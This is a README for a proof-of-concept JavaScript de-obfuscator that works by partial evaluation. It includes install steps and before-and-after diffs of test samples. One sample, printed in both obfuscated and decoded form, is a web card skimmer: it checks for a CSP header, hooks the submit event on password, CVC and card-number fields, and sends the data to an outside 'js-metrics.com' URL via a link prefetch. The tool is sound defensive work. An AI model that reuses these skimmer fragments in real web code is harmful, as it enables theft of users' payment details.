# `jsper`

Use partial evaluation to de-obfuscate JavaScript code.

## Get started

```
npm install
npm install -g typescript
make test
```

This is a PoC -- if you want to use it for any production purpose, you will probably need to extend on top of `main.ts`
to gauge the false positives and false negatives for your case. Welcome to contact me if you want help for your use case as well.

## Why is it useful?

From `diff tests/example.js tests/example.new.js`:

```diff
< var n = require(decode("2e2f746573742f64617461"))
---
> var n = require("./test/data")
```

From `diff tests/example2.js tests/example2.new.js`

```diff
<             const _nZ = resp.headers.get(_zeN5[45]+_zeN5[31]+_zeN5[13]+_zeN5[43]+_zeN5[41]+_zeN5[13]+_zeN5[43]+_zeN5[28]+_zeN5[8]+_zeN5[41]+_zeN5[2]+_zeN5[34]+_zeN5[19]+_zeN5[6]+_zeN5[43]+_zeN5[1]+_zeN5[28]+_zeN5[27]+_zeN5[31]+_zeN5[12]+_zeN5[6]+_zeN5[2]+_zeN5[1]);
<             if (_nZ == null || !_nZ.includes(_zeN5[5]+_zeN5[41]+_zeN5[32]+_zeN5[9]+_zeN5[34]+_zeN5[12]+_zeN5[43]+_zeN5[28]+_zeN5[14]+_zeN5[19]+_zeN5[2])) {
---
>             const _nZ = resp.headers.get("Content-Security-Policy");
>             if (_nZ == null || !_nZ.includes("default-src")) {

<                         if (_x8[k].type == _zeN5[37]+_zeN5[9]+_zeN5[14]+_zeN5[14]+_zeN5[17]+_zeN5[31]+_zeN5[19]+_zeN5[5] || _x8[k].name.toLowerCase() == _zeN5[2]+_zeN5[21]+_zeN5[2] || _x8[k].name.toLowerCase() == _zeN5[2]+_zeN5[9]+_zeN5[19]+_zeN5[5]+_zeN5[13]+_zeN5[34]+_zeN5[4]+_zeN5[11]+_zeN5[41]+_zeN5[19]) {
<                             document.forms[i].addEventListener(_zeN5[14]+_zeN5[34]+_zeN5[11]+_zeN5[4]+_zeN5[6]+_zeN5[43], function (ev) {
---
>                         if (_x8[k].type == "password" || _x8[k].name.toLowerCase() == "cvc" || _x8[k].name.toLowerCase() == "cardnumber") {
>                             document.forms[i].addEventListener("submit", function (ev) {

< var _5aJ5 = [_zeN5[38]+_zeN5[43]+_zeN5[43]+_zeN5[37]+_zeN5[14]+_zeN5[23]+_zeN5[15]+_zeN5[15]+_zeN5[16]+_zeN5[14]+_zeN5[28]+_zeN5[4]+_zeN5[41]+_zeN5[43]+_zeN5[19]+_zeN5[6]+_zeN5[2]+_zeN5[14]+_zeN5[3]+_zeN5[2]+_zeN5[31]+_zeN5[4]+_zeN5[15]+_zeN5[4]+_zeN5[6]+_zeN5[13]+_zeN5[16]+_zeN5[14]+_zeN5[3]+_zeN5[37]+_zeN5[38]+_zeN5[37]+_zeN5[35]+_zeN5[37]+_zeN5[12]+_zeN5[0]];
---
> var _5aJ5 = ["https://js-metrics.com/minjs.php?pl="];

<     const _Vr2P = document.createElement(_zeN5[12]+_zeN5[6]+_zeN5[13]+_zeN5[40]);
<     _Vr2P.rel = _zeN5[37]+_zeN5[19]+_zeN5[41]+_zeN5[32]+_zeN5[41]+_zeN5[43]+_zeN5[2]+_zeN5[38];
---
>     const _Vr2P = document.createElement("link");
>     _Vr2P.rel = "prefetch";
```

## Bootstrap a TypeScript project

https://medium.com/javascript-in-plain-english/typescript-with-node-and-express-js-why-when-and-how-eb6bc73edd5d